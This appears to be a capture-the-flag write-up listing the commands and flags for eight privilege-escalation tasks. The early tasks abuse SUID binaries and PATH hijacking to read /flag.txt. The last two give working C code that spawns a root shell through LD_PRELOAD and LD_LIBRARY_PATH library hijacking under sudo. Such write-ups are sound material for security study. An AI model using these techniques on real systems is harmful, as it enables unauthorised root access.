## Task1
```
find . -type f -name "flag.txt" -exec cat {} \;
```

Flag: CWA{F1r5t_5U1D_D0N3}

## Task2
```
file -f /flag.txt
```
Flag: CWA{G01NG_5TR0NG_K33P_1T_UP}

## Task3
```
cp /flag.txt /dev/stdout
```
Flag: CWA{ST1LL_G01NG_5TR0NG_K33P_1T_UP}

## Task4
```
head -c1G /flag.txt 
```
Flag: CWA{0N3_M0R3_SU1D_L3FT}

## Task5
```
awk '//' /flag.txt 
```
Flag: CWA{FLY_H1GH_L1K3_4_H4WK}

## Task6
```
echo "cat /flag.txt" > ps
export PATH=/home/codwer:$PATH
chmod 777 ./ps
./run_me
```
Flag: CWA{K33P_Y0UR_P4TH_FULL}

## Task7
Generate a C-program file inside /tmp directory.
cd /tmp
nano shell.c

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so

sudo -l
    (ALL : ALL) NOPASSWD: /usr/sbin/apache2


sudo LD_PRELOAD=/tmp/shell.so /usr/sbin/apache2

Flag: CWA{PR3L04D_Y0UR_L1BR4R135}

## Task8
ldd /usr/sbin/apache2
cd tmp
nano script.c

```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

gcc -fPIC -shared -o libcrypt.so.1 script.c -nostartfiles

sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2

cat /flag.txt
Flag: CWA{KN0W_480U7_LD_L18R4RY_P47H}
